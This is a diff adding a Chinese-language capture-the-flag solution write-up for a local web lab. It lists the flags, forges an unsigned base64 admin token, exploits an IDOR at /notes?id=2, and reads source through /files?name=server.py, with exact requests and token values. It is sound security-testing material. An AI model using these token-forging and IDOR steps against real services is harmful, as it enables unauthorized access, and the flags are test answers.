@@ -1,0 +1,24 @@
+## FLAG
+
+**主 FLAG（admin token 链终点，`/admin/config`）：`FLAG{api_chain_ok}`**
+
+副产物（IDOR 直接泄露的 admin note）：`FLAG{idor_user2}`
+
+## 攻击链（全部请求仅发往 http://127.0.0.1:18081）
+
+1. `GET /` → 端点清单 + 提示 `token=base64({json uid}) ; notes?id= may not check ownership`
+2. `GET /login` → 直接下发 `eyJ1aWQiOiAiMSIsICJ1c2VyIjogIiJ9` = `{"uid": "1", "user": ""}`，**无签名/无 HMAC**，可自造任意 uid → **E-002**
+3. **IDOR**：`GET /notes?id=2`（甚至不带 token）返回 `{"note": "admin-secret-FLAG{idor_user2}", ...}`；带 uid=1 token 时 `viewer:"1"`，证明只按 `?id=` 取数、不校验属主 → **E-003**
+4. 伪造 admin token：`base64({"uid": "2", "user": ""})` = `eyJ1aWQiOiAiMiIsICJ1c2VyIjogIiJ9`
+   - 无 token：`403 {"error":"admin only"}`
+   - 带伪造 token：`200 {"flag": "FLAG{api_chain_ok}", "debug": true}` → **E-004**
+5. `GET /files?name=server.py` 泄露源码，`USERS["2"]={role:admin}`、`NOTES["2"]`、`FLAG="FLAG{api_chain_ok}"` 与实测返回互证 → **E-005**
+
+## 引用的 E-id 列表
+
+- **E-002** — 根路径 / `/login` 无签名 token 签发
+- **E-003** — `/notes?id=2` IDOR 越权读取
+- **E-004** — 伪造 admin token → `/admin/config` 返回 FLAG
+- **E-005** — `/files?name=server.py` 源码佐证（数据模型与弱鉴权）
+
+（辅助：E-001 为开案记录；finding 已按上述 4 个 E-id 归档。）
